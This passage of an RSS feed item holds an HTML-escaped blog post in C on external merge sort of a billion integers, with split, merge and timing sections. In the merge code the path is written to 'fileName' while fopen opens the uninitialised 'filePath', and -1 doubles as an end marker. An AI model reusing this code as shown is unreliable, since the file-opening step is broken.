&lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;billion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s"&gt;"billion"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"rb"&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;TOTAL&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;PIECESIZE&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;  
    &lt;span class="n"&gt;fseek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;billion&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PIECESIZE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SEEK_SET&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;piece&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;PIECESIZE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;billion&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;qsort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PIECESIZE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;piece&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;comp&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;300&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;"pieces/piece%d"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"wb"&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;piece&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;PIECESIZE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#sort"&gt;
  &lt;/a&gt;
  SORT
&lt;/h3&gt;

&lt;p&gt;After 1 billion integers have been divided into 100 blocks, and these blocks were already sorted, we can read these blocks, apply merge sort, and write the results to the file in real time. During this period, memory consumption will remain low.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s"&gt;"out"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"wb"&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;  
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileName&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;"pieces/piece%d"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"rb"&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt; &lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kr"&gt;__int32&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;minIndex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MinIndex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;minIndex&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 

    &lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;minIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kr"&gt;__int32&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;minIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kr"&gt;__int32&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;minIndex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;feof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;minIndex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;minIndex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;fileList&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;outFile&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Among them, the &lt;code&gt;MinIndex&lt;/code&gt; function gets the subscript of the smallest value in the array, and it will skip when it encounters -1,  I used number &lt;code&gt;-1&lt;/code&gt; as end of file. If the &lt;code&gt;MinIndex&lt;/code&gt; function returns -1, it means that all files have been read.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;MinIndex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;arr&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;FILEAMOUNT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;arr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;According to the timer, it takes 240s to split + sort each block and 433s to merge. We can see that the hard disk IO performance is the bottleneck here.&lt;/p&gt;

</description>
      <category>sort</category>
      <category>c</category>
    </item>
  </channel>
</rss>
